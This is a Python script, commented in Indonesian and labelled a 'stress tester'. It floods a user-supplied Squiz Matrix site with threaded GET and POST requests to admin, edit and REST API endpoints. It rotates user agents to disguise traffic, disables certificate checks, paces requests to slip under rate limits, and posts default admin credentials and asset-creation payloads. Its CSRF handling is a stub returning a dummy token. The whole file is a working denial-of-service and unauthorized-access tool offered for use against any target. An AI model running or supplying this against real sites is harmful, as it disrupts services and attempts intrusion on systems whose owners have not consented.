import requests
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SquizMatrixTester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "SQ-ACTION": "login",  # Header khusus Squiz Matrix
        }
        # Endpoint yang umum ada di Squiz Matrix
        self.endpoints = [
            "_admin",  # Admin interface
            "_edit",   # Edit interface
            "_api/rest/v1/assets",  # REST API assets
            "_api/rest/v1/users",   # REST API users
            "_api/rest/v1/metadata", # REST API metadata
            "_admin/?SQ_ACTION=login", # Login endpoint
            "_admin/?SQ_ACTION=asset_map", # Asset map
            "_admin/?SQ_ACTION=workflow" # Workflow
        ]
        self.payloads = {
            "auth_test": {
                "SQ_LOGIN_USERNAME": "admin",
                "SQ_LOGIN_PASSWORD": "admin123",
                "SQ_ACTION": "login"
            },
            "asset_test": {
                "type": "page_standard",
                "parentid": "1",
                "name": "Test Page",
                "link_type": "1"
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True  # Squiz sering menggunakan redirect
                )
            else:
                # Tambahkan CSRF token jika diperlukan
                if data:
                    data["SQ_CSRF_TOKEN"] = self.get_csrf_token(url)
                response = requests.post(
                    full_url, 
                    json=data, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def get_csrf_token(self, url):
        """Mendapatkan CSRF token dari Squiz Matrix"""
        try:
            response = requests.get(
                f"{url.rstrip('/')}/_admin/?SQ_ACTION=login",
                headers={"User-Agent": self.get_random_user_agent()},
                verify=False
            )
            # Implementasi ekstraksi token dari response
            # Token biasanya ada di dalam form HTML atau response header
            return "dummy_token"  # Ganti dengan implementasi sebenarnya
        except:
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting stress test on {url} for {duration}s with {workers} threads")
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads.get("asset_test") if method == "POST" else None
                self.send_request(method, url, endpoint, data=payload)
                # Tambahkan delay kecil untuk menghindari rate limiting
                time.sleep(random.uniform(0.1, 0.5))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    target_url = input("Enter target Squiz Matrix URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        tester = SquizMatrixTester()
        tester.flood(target_url, workers=20, duration=120)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 